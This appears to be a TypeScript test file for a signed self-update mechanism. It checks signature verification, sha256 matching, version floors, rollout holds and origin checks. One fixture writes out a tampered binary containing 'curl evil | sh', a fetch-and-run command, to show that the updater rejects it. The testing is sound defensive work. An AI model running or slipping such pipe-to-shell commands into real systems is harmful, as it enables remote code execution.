import { afterEach, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { releasePublicKey, signRelease } from "@doriface/crypto";
import { selfUpdate, SelfUpdateError, type SelfUpdateOptions } from "./self-update.ts";

const ORIGIN = "https://get.doriterm.com";
// Any 32 bytes are an Ed25519 seed.
const key = crypto.getRandomValues(new Uint8Array(32));
const otherKey = crypto.getRandomValues(new Uint8Array(32));
const trusted = [releasePublicKey(key)];
const NEW_BINARY = '#!/bin/sh\necho "doriface-host 0.1.17"\n';
const sha = (text: string): string => new Bun.CryptoHasher("sha256").update(text).digest("hex");

const dirs: string[] = [];
afterEach(() => dirs.splice(0).forEach((dir) => rmSync(dir, { recursive: true, force: true })));

interface Release {
  readonly manifest?: Record<string, unknown>;
  readonly signWith?: Uint8Array;
  readonly tamperSignature?: boolean;
  readonly download?: string;
}

function rig(release: Release = {}) {
  const dir = mkdtempSync(join(tmpdir(), "self-update-"));
  dirs.push(dir);
  const binary = join(dir, "doriface-host");
  writeFileSync(binary, "old binary", { mode: 0o755 });
  const manifest = {
    version: "0.1.17",
    rollout: 100,
    minimum: "0.1.10",
    targets: {
      "linux-x64": {
        url: `${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`,
        sha256: sha(NEW_BINARY),
        size: NEW_BINARY.length,
      },
    },
    ...release.manifest,
  };
  const body = JSON.stringify(manifest);
  const signed = signRelease(
    new TextEncoder().encode(release.tamperSignature ? `${body} ` : body),
    release.signWith ?? key,
  );
  const files: Record<string, string> = {
    [`${ORIGIN}/host/stable/manifest.json`]: body,
    [`${ORIGIN}/host/stable/manifest.json.sig`]: signed,
    [`${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`]: release.download ?? NEW_BINARY,
  };
  const fetched: string[] = [];
  const options: SelfUpdateOptions = {
    channel: "stable",
    currentVersion: "0.1.16",
    binary,
    updaterId: "00000000-0000-4000-8000-000000000000",
    platform: "linux",
    arch: "x64",
    trustedKeys: trusted,
    fetcher: async (url) => {
      fetched.push(url);
      const text = files[url];
      return text === undefined ? new Response("missing", { status: 404 }) : new Response(text);
    },
  };
  const downloaded = () => fetched.some((url) => url.endsWith("doriface-host-linux-x64"));
  const untouched = () => readFileSync(binary, "utf8") === "old binary" && !existsSync(`${binary}.new`);
  return { binary, options, downloaded, untouched };
}

const refusal = async (promise: Promise<unknown>): Promise<string> => {
  const error = await promise.then(
    () => undefined,
    (caught: unknown) => caught,
  );
  if (!(error instanceof SelfUpdateError)) throw new Error(`expected a SelfUpdateError, got ${String(error)}`);
  return error.phase;
};

test("a signed, newer, rolled-out build is checked, run with --version and renamed over the binary", async () => {
  const r = rig();
  expect(await selfUpdate(r.options)).toEqual({ kind: "updated", version: "0.1.17" });
  expect(readFileSync(r.binary, "utf8")).toBe(NEW_BINARY);
  expect(statSync(r.binary).mode & 0o777).toBe(0o755);
  expect(existsSync(`${r.binary}.new`)).toBe(false);
});

test("a manifest with a bad signature, or one by a key this build does not trust, stops before any download", async () => {
  for (const release of [{ tamperSignature: true }, { signWith: otherKey }]) {
    const r = rig(release);
    // oxlint-disable-next-line no-await-in-loop -- each case has its own rig
    expect(await refusal(selfUpdate(r.options))).toBe("signature");
    expect([r.downloaded(), r.untouched()]).toEqual([false, true]);
  }
  const unsigned = rig();
  expect(await refusal(selfUpdate({ ...unsigned.options, trustedKeys: [] }))).toBe("signature");
});

test("a download whose sha256 does not match the signed manifest replaces nothing", async () => {
  const r = rig({ download: '#!/bin/sh\necho "doriface-host 0.1.17"; curl evil | sh\n' });
  expect(await refusal(selfUpdate(r.options))).toBe("verify");
  expect(r.untouched()).toBe(true);
});

test("a host below the manifest's floor is told to reinstall and downloads nothing", async () => {
  const r = rig();
  expect(await selfUpdate({ ...r.options, currentVersion: "0.1.9" })).toEqual({
    kind: "below-minimum",
    version: "0.1.17",
    minimum: "0.1.10",
  });
  expect([r.downloaded(), r.untouched()]).toEqual([false, true]);
});

test("with rollout 0 every host stays where it is, and nothing older or equal is ever installed", async () => {
  const held = rig({ manifest: { rollout: 0 } });
  expect(await selfUpdate(held.options)).toEqual({ kind: "held", version: "0.1.17", rollout: 0 });
  expect([held.downloaded(), held.untouched()]).toEqual([false, true]);
  const same = rig();
  expect(await selfUpdate({ ...same.options, currentVersion: "0.1.17" })).toEqual({
    kind: "current",
    version: "0.1.17",
  });
  expect(await selfUpdate({ ...same.options, currentVersion: "0.2.0" })).toEqual({ kind: "current", version: "0.2.0" });
  expect(same.downloaded()).toBe(false);
});

test("a build hosted elsewhere, a binary that answers another version, or a malformed manifest replaces nothing", async () => {
  const elsewhere = rig({
    manifest: {
      targets: {
        "linux-x64": { url: "https://example.com/doriface-host", sha256: sha(NEW_BINARY), size: NEW_BINARY.length },
      },
    },
  });
  expect(await refusal(selfUpdate(elsewhere.options))).toBe("manifest");
  const liar = '#!/bin/sh\necho "doriface-host 0.1.16"\n';
  const wrong = rig({
    download: liar,
    manifest: {
      targets: {
        "linux-x64": {
          url: `${ORIGIN}/host/stable/0.1.17/doriface-host-linux-x64`,
          sha256: sha(liar),
          size: liar.length,
        },
      },
    },
  });
  expect(await refusal(selfUpdate(wrong.options))).toBe("check");
  expect(wrong.untouched()).toBe(true);
  const malformed = rig({ manifest: { rollout: 150 } });
  expect(await refusal(selfUpdate(malformed.options))).toBe("manifest");
});
